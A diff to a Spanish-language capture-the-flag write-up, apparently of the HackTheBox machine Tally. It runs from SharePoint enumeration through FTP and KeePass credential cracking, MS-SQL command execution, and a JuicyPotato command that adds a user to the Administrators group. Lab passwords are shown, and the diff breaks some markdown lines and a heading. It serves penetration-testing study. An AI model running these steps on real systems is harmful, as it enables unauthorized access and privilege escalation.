@@ -103,15 +103,27 @@ Nos enfrentamos a un Microsoft Sharepoint con un IIS 10.0
 
 #### Analyzando la web con Firefox {-}
 
-Entramos en un panel Sharepoint y vemos en la url que hay un `_layouts`
+Entramos en un panel Sharepoint y vemos en la url que hay un 
+```bash
+ _layouts 
+```
 
-Buscamos en google por la palabra `sharepoint pentest report` y encontramos la web de [pentest-tool](https://pentest-tools.com/public/sample-reports/sharepoint-scan-sample-report.pdf). Esto
+
+Buscamos en google por la palabra 
+```bash
+ sharepoint pentest report 
+```
+ y encontramos la web de [pentest-tool](https://pentest-tools.com/public/sample-reports/sharepoint-scan-sample-report.pdf). Esto
 
 
 
 ## Vulnerability Assessment {-}
 
-### Sharepoint `_layouts` {-}
+### Sharepoint 
+```bash
+ _layouts 
+```
+ {-}
 
 El enlaze de la pagina web es un reporte donde se pueden ver routas interesantes detectadas durante un processo de auditoria.
 
@@ -128,10 +140,18 @@ El enlaze de la pagina web es un reporte donde se pueden ver routas interesantes
 - http://sharepointtarget.com//_layouts/recyclebin.aspx
 - http://sharepointtarget.com//_layouts/spcf.aspx
 
-Si vamos a la url `http://10.10.10.59/_layouts/viewlsts.aspx` ya vemos cosas interesantes. Si pinchamos en Shared Documents podemos ver un documento
+Si vamos a la url 
+```bash
+ http://10.10.10.59/_layouts/viewlsts.aspx 
+```
+ ya vemos cosas interesantes. Si pinchamos en Shared Documents podemos ver un documento
 llamado ftp-details y si pinchamos en Site Pages vemos un fichero FinanceTeam. Nos los descargamos.
 
-Si abrimos el fichero `ftp-details.docx` con libre office vemos una contraseña. Si miramos la pagina FinanceTeam, vemos un mensaje donde podemos ver
+Si abrimos el fichero 
+```bash
+ ftp-details.docx 
+```
+ con libre office vemos una contraseña. Si miramos la pagina FinanceTeam, vemos un mensaje donde podemos ver
 usuarios potenciales y un ftp account name.
 
 ### Conneccion con FTP {-}
@@ -142,7 +162,15 @@ Name: ftp_user
 Password: UTDRSCH3c"$6hys
 ```
 
-Hemos podido authenticarnos. Si le damos a `dir` vemos muchos directorios. Si es el caso, S4vi nos propone usar de la Heramienta `curlftpfs` para montarnos
+Hemos podido authenticarnos. Si le damos a 
+```bash
+ dir 
+```
+ vemos muchos directorios. Si es el caso, S4vi nos propone usar de la Heramienta 
+```bash
+ curlftpfs 
+```
+ para montarnos
 una montura por ftp
 
 ```bash
@@ -153,7 +181,11 @@ cd /mnt/ftp
 tree
 ```
 
-Aqui vemos un fichero `tim.kdbx`. Es interesante porque los ficheros **KDBX** son ficheros KeePass y suelen tener informaciones interesantes como contraseñas.
+Aqui vemos un fichero 
+```bash
+ tim.kdbx 
+```
+. Es interesante porque los ficheros **KDBX** son ficheros KeePass y suelen tener informaciones interesantes como contraseñas.
 
 ```bash
 cp User/Tim/Files/tim.kdbx /home/s4vitar/Desktop/S4vitar/Tally/content/.
@@ -162,7 +194,11 @@ chmod 644 tim.kdbx
 apt install keepassxc
 ```
 
-Si lanzamos el KeePassxc y que le damos a abrir una base de datos existente, buscamos el fichero `tim.kdbx` vemos que nos pide una contraseña.
+Si lanzamos el KeePassxc y que le damos a abrir una base de datos existente, buscamos el fichero 
+```bash
+ tim.kdbx 
+```
+ vemos que nos pide una contraseña.
 En este caso bamos a lanzar un keepass2john para crackear la contraseña.
 
 ### Crackeando un fichero KDBX con keepass2john {-}
@@ -191,7 +227,15 @@ cd /mnt/smb
 tree
 ```
 
-Aqui vemos que hay ficheros ejecutables en la carpeta `zz_Migration/Binaries/New Folder/` y un binario llamado `tester.exe` nos
+Aqui vemos que hay ficheros ejecutables en la carpeta 
+```bash
+ zz_Migration/Binaries/New Folder/ 
+```
+ y un binario llamado 
+```bash
+ tester.exe 
+```
+ nos
 llama la attencion.
 
 ```bash
@@ -214,7 +258,11 @@ radare2 tester.exe
 
 Bueno aqui podemos ver un usuario y una contraseña para la base de datos MS-SQL 
 
-> [ ! ]NOTAS: tambien se podria usar el commando `strings tester.exe | grep "PWD" | tr ';' '\n' | batcat`
+> [ ! ]NOTAS: tambien se podria usar el commando 
+```bash
+ strings tester.exe | grep "PWD" | tr ';' '\n' | batcat 
+```
+
 
 ### Conneccion a la base de datos {-}
 
@@ -252,7 +300,11 @@ go
 tally\sarah
 ```
 
-> [ ! ]NOTAS: tambien se podria usar el commando `impacker-mssqlclient WORKGROUP/sa@10.10.10.59` y con este commando no tendriamos que darle siempre a go.
+> [ ! ]NOTAS: tambien se podria usar el commando 
+```bash
+ impacker-mssqlclient WORKGROUP/sa@10.10.10.59 
+```
+ y con este commando no tendriamos que darle siempre a go.
 
 Como tenemos possiblidad de ejecutar commandos a nivel de systema, nos vamos a connectar a la maquina.
 ## Vuln exploit & Gaining Access {-}
@@ -290,7 +342,11 @@ systeminfo
 whoami /priv
 ```
 
-Aqui vemos que tenemos el `SeImpersonatePrivilege` ;)
+Aqui vemos que tenemos el 
+```bash
+ SeImpersonatePrivilege 
+```
+ ;)
 
 Tiramos como siempre de JuicyPotatoe.exe
 
@@ -318,7 +374,11 @@ Nos creamos un nuevo usuario con el JuicyPotato.
 ./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators s4vitar /add"
 ```
 
-Si comprobamos con el commando `crackmapexec smb 10.10.10.59 -u 's4vitar' -p 's4vitar1234$!'` Vemos que el usuario no esta pwned.
+Si comprobamos con el commando 
+```bash
+ crackmapexec smb 10.10.10.59 -u 's4vitar' -p 's4vitar1234$!' 
+```
+ Vemos que el usuario no esta pwned.
 Aqui tenemos que 
 
 ```bash
